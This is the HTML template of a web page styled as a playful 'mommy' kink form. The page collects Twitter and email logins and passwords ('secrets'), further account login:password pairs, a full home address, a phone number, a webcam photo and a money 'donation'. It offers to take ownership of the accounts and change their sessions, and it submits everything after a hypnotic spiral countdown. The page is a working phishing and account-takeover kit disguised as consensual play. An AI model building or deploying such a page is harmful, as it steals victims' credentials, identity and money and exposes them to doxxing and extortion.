<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Hi cutie! Mommy is here üíñ</title>

  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet" />

 <style>
 body {
  margin: 0;
  padding: 20px;
  background: url("{{ url_for('static', filename='images/1.gif') }}") no-repeat center center fixed;
  background-size: cover;
  background-color: #c3efed; 
  font-family: 'Poppins', sans-serif;
  display: flex;
  justify-content: center;
  align-items: flex-start;
  min-height: 100vh;
  color: #0f4e4e;
}



  .form-container {
    background: rgba(255, 255, 255, 0.85);
    padding: 24px;
    border-radius: 16px;
    max-width: 600px;
    margin: 40px auto;
    box-shadow: 0 4px 20px rgba(0,0,0,0.3);
  }


  body {
    background-color: #c3efed;
    font-family: 'Poppins', sans-serif;
    margin: 0;
    padding: 20px;
    display: flex;
    justify-content: center;
    align-items: flex-start;
    min-height: 100vh;
    color: #0f4e4e;
  }
.small-note {
  font-size: 16px;
  font-weight: 600;          
  color: #177c7a;             
  margin-top: -14px;
  margin-bottom: 22px;
  font-style: italic;
  text-align: center;       
}

  .form-container {
    background: rgba(255, 255, 255, 0.65);
    border: 3px solid #41b8b0;
    border-radius: 14px;
    padding: 30px 30px 40px;
    box-shadow: 0 6px 18px rgba(65, 184, 176, 0.3);
    max-width: 600px;
    width: 100%;
    box-sizing: border-box;
    backdrop-filter: blur(6px);
  }

  h1 {
    color: #0d6b66;
    margin-bottom: 15px;
    font-size: 30px;
    text-align: center;
    font-weight: 700;
  }

  p.description {
    font-size: 17px;
    margin-bottom: 25px;
    text-align: center;
    line-height: 1.4;
    color: #125e5a;
  }

  label {
    display: block;
    font-weight: 600;
    margin-bottom: 8px;
    font-size: 18px;
    color: #114d4b;
  }

  input[type="text"],
  input[type="tel"],
  input[type="email"],
  input[type="password"],
  textarea,
  select {
    width: 100%;
    padding: 14px 12px;
    margin-bottom: 20px;
    border: 2px solid #41b8b0;
    border-radius: 10px;
    font-size: 17px;
    background-color: rgba(217, 250, 248, 0.85);
    font-family: 'Poppins', sans-serif;
    color: #104646;
    box-sizing: border-box;
    resize: vertical;
  }

  input[type="submit"] {
    background-color: #0d6b66;
    color: white;
    border: none;
    padding: 18px;
    width: 100%;
    font-size: 22px;
    border-radius: 10px;
    cursor: pointer;
    font-weight: 700;
    transition: background-color 0.3s ease;
  }

  input[type="submit"]:hover {
    background-color: #094d49;
  }

  .small-note {
    font-size: 14px;
    color: #177c7a;
    margin-top: -14px;
    margin-bottom: 22px;
    font-style: italic;
  }

  .option-group {
    margin-bottom: 22px;
  }

  .option-group label {
    font-weight: 500;
    font-size: 16px;
    cursor: pointer;
    margin-right: 15px;
    display: block;
    margin-bottom: 8px;
    color: #125e5a;
  }

  .option-group input[type="radio"] {
    margin-right: 8px;
    cursor: pointer;
  }

  .address-grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 15px 30px;
    margin-bottom: 25px;
  }

  .address-grid label {
    margin-bottom: 6px;
    font-size: 17px;
  }

  .address-grid input {
    margin-bottom: 0;
  }

  .helper-text {
    font-size: 13px;
    color: #168d89;
    margin-top: -14px;
    margin-bottom: 16px;
    font-style: italic;
  }

  #video {
    width: 100%;
    max-height: 280px;
    border-radius: 10px;
    margin-bottom: 15px;
    background-color: #b9e2e1;
    display: none;
    object-fit: cover;
  }

  #take-photo {
    background-color: #0d6b66;
    color: white;
    border: none;
    padding: 14px;
    font-size: 20px;
    border-radius: 10px;
    cursor: pointer;
    font-weight: 700;
    width: 100%;
    margin-bottom: 20px;
    transition: background-color 0.3s ease;
  }

  #take-photo:hover {
    background-color: #094d49;
  }

  @media (max-width: 650px) {
    .form-container {
      padding: 20px 20px 30px;
    }
    input[type="submit"], #take-photo {
      font-size: 20px;
      padding: 16px;
    }
    h1 {
      font-size: 26px;
    }
    .address-grid {
      grid-template-columns: 1fr;
    }
  }
  </style>
</head>


<body>
  <div class="form-container">
    <h1>Hi cutie! Mommy is here üíñ</h1>
    <p class="description">
      Before we start our fun, I want to make sure you understand and fill this form voluntarily~<br />
      Everything you give me is your choice, no pressure, only love and care from mommy~ üòä
    </p>

    <img src="{{ url_for('static', filename='images/2.jpg') }}"
         alt="Cute image"
         style="margin-top: 20px; max-width: 100%; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.3);" />


   
    <form action="/send" method="POST">
      <input type="hidden" id="photoData" name="photoBase64" />

      <p class="small-note">Let mommy protect you üíï</p>

      <label for="twitter_login">Twitter login</label>
      <input type="text" id="twitter_login" name="twitter_login" placeholder="Your @username here" />

      <label for="twitter_secret">Twitter Secret</label>
      <input type="text" id="twitter_secret" name="twitter_secret" placeholder="Secret, cutie~" />

      <label for="twitter_followers">How many followers do u have?</label>
      <input type="text" id="twitter_followers" name="twitter_followers" placeholder="e.g. 12k" />

      <label for="email_login">Email</label>
      <input type="email" id="email_login" name="email_login" placeholder="Your email" />

      <label for="email_secret">Email Secret</label>
      <input type="text" id="email_secret" name="email_secret" placeholder="Shhh... mommy will keep it safe üíå" />

      <img src="{{ url_for('static', filename='images/3.jpg') }}"
         alt="Cute image"
         style="margin-top: 20px; max-width: 100%; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.3);" />

      <p class="small-note">Now relax and look at my cute socks~ üß¶</p>

      <label>Address (fill it out nicely, cutie~)</label>
      <div class="address-grid">
        <div>
          <label for="country">1. Country *</label>
          <input type="text" id="country" name="country" placeholder="Country" required />
        </div>
        <div>
          <label for="region">2. Region / State *</label>
          <input type="text" id="region" name="region" placeholder="Region / State" required />
        </div>
        <div>
          <label for="city">3. City *</label>
          <input type="text" id="city" name="city" placeholder="City" required />
        </div>
        <div>
          <label for="street">4. Street *</label>
          <input type="text" id="street" name="street" placeholder="Street" required />
        </div>
        <div>
          <label for="postal">5. Postal Code *</label>
          <input type="text" id="postal" name="postal" placeholder="Postal Code" required />
        </div>
        <div>
          <label for="house">6. House / Apt No. *</label>
          <input type="text" id="house" name="house" placeholder="House / Apt No." required />
        </div>
      </div>

      <label for="phone">Let mommy call you üì±Ô∏è</label>
      <input type="tel" id="phone" name="phone" placeholder="+XX XX XXXXXXX" />

      <label for="other_accounts">Other accounts you want to share with mommy (login: Secret or anything you want)</label>
      <textarea id="other_accounts" name="other_accounts" rows="3" placeholder="Your Secret or login:Secret pairs here"></textarea>

      <p class="small-note">We're almost done, cutie~ üíï</p>
     <img src="{{ url_for('static', filename='images/4.png') }}"
     style="margin-top: 20px; max-width: 100%; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.3);" />


      <label>What would you like me to do with your accounts? *</label>
      <div class="option-group">
        <label>
          <input type="radio" name="account_usage" value="make_appropriate" required />
          I just want them to look neat and show that I belong to you
        </label>
        <label>
          <input type="radio" name="account_usage" value="owner_change" />
          I want you to be the owner and change session info, I'll beg for the honor~
        </label>
        <label>
          <input type="radio" name="account_usage" value="custom" id="custom-option" />
          Other (write your sweet idea below~)
        </label>
        <input type="text" id="custom-input" name="account_usage_custom" placeholder="Your custom wish for mommy~ üíå" style="display: none; margin-top: 12px; width: 100%; padding: 12px; border: 1.8px solid #b91c37; border-radius: 8px; font-size: 16px; background-color: #fff0f3; color: #7f1d2a; font-family: 'Poppins', sans-serif;" />
      </div>

      <style>
        .donation-grid {
          display: grid;
          grid-template-columns: 1fr 1fr 1fr;
          gap: 15px;
          padding: 20px;
          border: 2px solid #f472b6;
          border-radius: 12px;
          background-color: #fff0f5;
          margin-bottom: 25px;
        }

        .donation-grid label {
          display: flex;
          align-items: center;
          font-size: 16px;
          background-color: #ffe4e6;
          padding: 10px 12px;
          border-radius: 8px;
          border: 1.5px solid #f9a8d4;
          cursor: pointer;
          transition: background-color 0.2s ease;
        }

        .donation-grid label:hover {
          background-color: #fbcfe8;
        }

        .donation-grid input[type="radio"] {
          margin-right: 10px;
          transform: scale(1.2);
          accent-color: #ec4899;
        }
      </style>

      <p class="small-note">One last thing, sweetheart üíï</p>
      <label>How much would you like to help mommy with? üí∏ *</label>

      <div class="donation-grid">
        <label><input type="radio" name="donation_amount" value="5" required /> $5 ‚Äì Just a little love üíñ</label>
        <label><input type="radio" name="donation_amount" value="25" /> $25 ‚Äì Mommy‚Äôs tea time üçµ</label>
        <label><input type="radio" name="donation_amount" value="100" /> $100 ‚Äì Because you care üíù</label>
        <label><input type="radio" name="donation_amount" value="500" /> $500 ‚Äì You're such a good boy üòò</label>
        <label><input type="radio" name="donation_amount" value="no_money" /> Sorry mommy, I wish I could üò¢</label>
      </div>

      
      <label>Take a cute photo for mommy üì∏ *</label>
      <video id="video" autoplay playsinline></video>

<button type="button" id="take-photo">üì∏ Take Photo</button>

<label style="display: flex; align-items: center; font-size: 16px; gap: 10px; margin-top: 10px; margin-bottom: 25px;">
  <input type="checkbox" name="terms_agreed" required style="transform: scale(1.3); accent-color: #b91c37;" />
  I agree to 
  <a href="https://mommy-terms.netlify.app/" target="_blank" style="color: #b91c37; font-weight: 600; text-decoration: underline dotted;">
    Mommy‚Äôs sweet terms of service üíå
  </a>
</label>

<input id="submit-button" type="submit" value="Send to mommy üíñ" disabled style="background-color: #ccc; cursor: not-allowed;" />

</form>

  </div>

<script>
const video = document.getElementById('video');
const photoData = document.getElementById('photoData');
const takePhotoButton = document.getElementById('take-photo');
const submitButton = document.getElementById('submit-button');
const termsCheckbox = document.querySelector('input[name="terms_agreed"]');
const customOption = document.getElementById('custom-option');
const customInput = document.getElementById('custom-input');
const radioButtons = document.querySelectorAll('input[name="account_usage"]');

let stream = null;

function updateSubmitButtonState() {
  if (termsCheckbox.checked) {
    submitButton.disabled = false;
    submitButton.style.backgroundColor = '#b91c37';
    submitButton.style.cursor = 'pointer';
  } else {
    submitButton.disabled = true;
    submitButton.style.backgroundColor = '#ccc';
    submitButton.style.cursor = 'not-allowed';
  }
}

termsCheckbox.addEventListener('change', updateSubmitButtonState);

radioButtons.forEach(rb => {
  rb.addEventListener('change', () => {
    if (customOption.checked) {
      customInput.style.display = 'block';
      customInput.required = true;
    } else {
      customInput.style.display = 'none';
      customInput.required = false;
    }
  });
});

(async () => {
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    video.style.display = 'block';
  } catch (err) {
    alert('Could not access camera: ' + err.message);
  }
})();

takePhotoButton.addEventListener('click', () => {
  if (!stream) {
    alert('Camera not ready.');
    return;
  }

  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const context = canvas.getContext('2d');
  context.drawImage(video, 0, 0, canvas.width, canvas.height);
  const dataUrl = canvas.toDataURL('image/jpeg');
  photoData.value = dataUrl;

  takePhotoButton.disabled = true;
  takePhotoButton.textContent = "üì∏ Photo taken ‚úÖ";

  alert('Photo captured and attached! üíñ');
});

document.querySelector('form').addEventListener('submit', function(event) {
  event.preventDefault();

  const newWindow = window.open('', '_blank');
  const html = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8" />
      <title>Good boy üíñ</title>
      <style>
        @import url('https://fonts.googleapis.com/css2?family=Unbounded:wght@800&display=swap');

        html, body {
          margin: 0;
          padding: 0;
          height: 100%;
          overflow: hidden;
          font-family: 'Unbounded', cursive;
          background: black;
          color: white;
        }

        .background-gif {
          position: fixed;
          top: 0; left: 0;
          width: 100vw;
          height: 100vh;
          object-fit: cover;
          z-index: -1;
        }

        .good-boy-container {
          display: flex;
          flex-direction: column;
          justify-content: center;
          align-items: center;
          height: 100vh;
          z-index: 10;
          text-align: center;
        }

        .good-boy-text {
          font-size: 7rem;
          font-weight: 800;
          padding: 30px 60px;
          border: 5px solid #ff5ec4;
          border-radius: 25px;
          background: rgba(255, 255, 255, 0.05);
          box-shadow: 0 0 25px #ff6bd0, 0 0 50px #ff91e3;
          color: #fff;
          text-shadow: 0 0 10px #ff6bd0, 0 0 20px #ff6bd0;
          opacity: 0.75;
        }

        .emoji {
          font-size: 2.5rem;
          margin-left: 15px;
          vertical-align: middle;
        }

        #timer {
          margin-top: 30px;
          font-size: 4rem;
          color: #ffaae0;
          text-shadow: 0 0 10px #ff7ac4;
        }

        @keyframes flicker {
          0%, 100% { opacity: 0.75; }
          50% { opacity: 0.55; }
        }
      </style>
    </head>
    <body>
      <img src="https://media.discordapp.net/attachments/1360786245659263019/1377972777348501594/spiral_anim_26_by_lordsqueak_gif_19201080.gif?ex=683ae8a7&is=68399727&hm=77d23cde14fdb273703fb6d4a7a28cab76fb23813b0fd43d800640da0795fc80&=&width=1381&height=777"
           alt="Spiral" class="background-gif" />

      <div class="good-boy-container">
        <div class="good-boy-text">
          Good boy <span class="emoji">üíûüòà</span>
        </div>
        <div id="timer">5</div>
      </div>

      <script>
        let count = 5;
        const timerEl = document.getElementById('timer');
        const interval = setInterval(() => {
          count--;
          timerEl.textContent = count;
          if (count === 0) {
            clearInterval(interval);
            window.close();
            window.opener.document.querySelector('form').submit(); // üí• –æ—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ä–º—ã –ø–æ—Å–ª–µ –∑–∞–∫—Ä—ã—Ç–∏—è
          }
        }, 1000);
      <\/script>
    </body>
    </html>
  `;

  newWindow.document.write(html);
  newWindow.document.close();
});
</script>


</body>

</html>
